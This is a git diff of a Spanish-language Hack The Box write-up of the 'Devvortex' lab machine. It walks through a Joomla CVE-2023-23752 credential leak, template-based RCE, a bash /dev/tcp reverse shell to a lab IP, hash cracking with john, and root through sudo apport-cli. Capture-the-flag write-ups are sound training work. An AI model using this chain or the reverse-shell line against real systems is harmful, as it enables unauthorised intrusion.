@@ -1,4 +1,19 @@
+---
+layout: single
+title: Devvortex - Hack The Box
+excerpt: ""
+date: 2023-11-25
+classes: wide
+header:
+  teaser: /assets/images/htb-writeup-devvortex/devvortex_logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
+categories:
+  - hackthebox
+tags:
+  - NoSQL Injection (Authentication Bypass)
 
+---
 
 # PortScan
 ___
@@ -25,7 +40,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 # WebSite
 ___
-![[Pasted image 20231125200148.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125200148.png)
 
 
 Indagando en el código fuente a primera vista no encontré nada, opté por buscar posibles directorio interesantes con "**GoBuster**" pero tampoco encontré nada, así qué decidí buscar posibles **sub-dominios** existentes para éste dominio con la misma herramienta "Gobuster".
@@ -53,27 +68,27 @@ Encontraríamos un sub-dominio "**dev.devvortex.htb**", lo añadimos al **"/etc/
 
 
 Encontraríamos el directorio "**/administrator**", así que ingreso a éste porque me interesa ver qué hay, encontrándonos con un panel de autenticación del **CMS** Joomla.
-![[Pasted image 20231125202429.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125202429.png)
 
 Se me ocurrió usar la herramienta "**joomscan**" para buscar posibles vulnerabilidades en la versión de éste Joomla, pero no encontré nada, pero al menos la herramienta me reportó la versión del **CMS**, qué es **4.2.6**, así qué indagué en internet sobre posibles vulnerabilidades para ésta versión de Joomla.
 
 Encontré la vulnerabilidad [CVE-2023-23752](https://vulncheck.com/blog/joomla-for-rce), que nos permite abusar de una verificación de acceso incorrecto de esta versión hasta la 4.0.0, para poder filtrar información privilegiada qué no deberíamos tener acceso, exactamente acceso en texto claro a las credenciales de usuarios del CMS.
 
-![[Pasted image 20231125203847.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125203847.png)
 
 Procedemos a usar éstas credenciales para loguearnos como el usuario "**lewis**" en el CMS.
 
-![[Pasted image 20231125204027.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204027.png)
 
 Hemos logrado acceso al CMS como "**lewis**", ahora buscamos una manera de poder ganar acceso a la máquina, lo qué se me ocurre es ver los "site templates", ver sí tenemos permiso para escribir en ellos & modificarlos de tal manera qué podamos llevar a cabo un **RCE**.
 
 Para ello voy a **System** > Sites Templates > y selecciono el único template existente.
 
-![[Pasted image 20231125204201.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204201.png)
 
 Tengo varios recursos, intento ver en cual puedo escribir.
 
-![[Pasted image 20231125204250.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204250.png)
 
 Hemos logrado cambiar el recurso "**error.php**", así que ingreso un script PHP malicioso para poder llevar a cabo el RCE.
 
@@ -82,7 +97,7 @@ Hemos logrado cambiar el recurso "**error.php**", así que ingreso un script PHP
 ```
 
 Una vez guardado, vamos al recurso "**error.php**", para poner el parámetro "**cmd**" en la URL y controlar el comando que queramos ejecutar.
-![[Pasted image 20231125204632.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204632.png)
 
 Estamos logrando llevar a cabo el **RCE**, así que procedemos a entablarnos una Reverse Shell con la máquina víctima.
 
@@ -96,7 +111,7 @@ nc -nlvp PORT
 bash -c "bash -i >%26 /dev/tcp/10.10.x.x/PORT 0>%261"
 ```
 
-![[Pasted image 20231125204932.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125204932.png)
 
 Estaríamos conectados, y sólo faltaría darle tratamiento a la TTY, qué sino sabemos como [((Entra a éste POST))](https://4uli.github.io/tratamiento-tty/)
 
@@ -105,13 +120,13 @@ ___
 Vemos los usuarios válidos del sistema con directorios en **home**, viendo qué tiene un directorio personal un usuario llamado "**logan**", así qué me gustaría migrar a éste usuario & ya qué el que estamos actualmente no tiene ningún privilegio qué podamos aprovechar para convertirnos a Root, por lo qué se me ocurre ver sí hay reutilización de contraseñas, pero no.
 
 Indagando, en la carpeta del código fuente del **sub-dominio**, en "**/var/www/**", vemos el recurso.
-![[Pasted image 20231125205328.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125205328.png)
 
-![[Pasted image 20231125205546.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125205546.png)
 
 vemos lo qué aparentemente sería el usuario de la base de datos **MySQL**, corroboro qué haya algún puerto con este servicio corriendo.
 
-![[Pasted image 20231125205928.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125205928.png)
 
 Qué suele usarse para servicio **MySQL**, así que opto por intentar ingresar con éste usuario & reusando la contraseña que usé para el **CMS** para ver si logro acceso.
 
@@ -119,14 +134,14 @@ Qué suele usarse para servicio **MySQL**, así que opto por intentar ingresar c
 mysql -u lewis -p -h localhost -D joomla
 ```
 
-![[Pasted image 20231125210145.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125210145.png)
 
 Logrando acceso, así qué listando las tablas interesantes de la **DB Joomla**, me encontré con una tabla de mi interés.
-![[Pasted image 20231125210255.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125210255.png)
 
 que tendría como contenido en sus columnas, lo siguiente:
 
-![[Pasted image 20231125211225.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125211225.png)
 
 Siendo primero el nombre  luego nombre de usuario, correo y por último la contraseña, pero está hasheada.
 
@@ -148,11 +163,11 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 y nos reportará la contraseña que coincide con el hash.
 
-![[Pasted image 20231125211657.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125211657.png)
 
 intentamos convertirnos en **logan** con éstas credenciales.
 
-![[Pasted image 20231125211728.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125211728.png)
 
 # Escalada de Privilegios #2 
 _____
@@ -162,7 +177,7 @@ sí como "**logan**" vemos los permisos **SUDOERS**
 sudo -l
 ```
 
-![[Pasted image 20231125212033.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125212033.png)
 
 Vemos qué podemos ejecutar como quien sea el "**apport-cli**", no tengo ni idea qué esto, así que hago una búsqueda rápida en internet, y descubro qué es una herramienta que sirve para informe de errores, indago más para posibles abusos con éste binario & me encuentro con la vulnerabilidad [CVE-2023-1326](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb), qué nos dice que si podemos ejecutar con sudo éste programa podríamos aprovecharnos de ésto para convertirnos en usuario root, así que procedo a guiarme del **PoC** para llevar a cabo la escalada.
 
@@ -174,7 +189,7 @@ sudo /usr/bin/apport-cli -f /var/crash/archivo.crash --pid=23
 2. Una vez cargue, elegimos la opción "**V**".
 
 3. Llamamos una **bash**.
-![[Pasted image 20231125213018.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125213018.png)
 
 Convirtiéndonos en **Root**.
-![[Pasted image 20231125213100.png]]
+![](/assets/images/htb-writeup-devvortex/Pasted image 20231125213100.png)
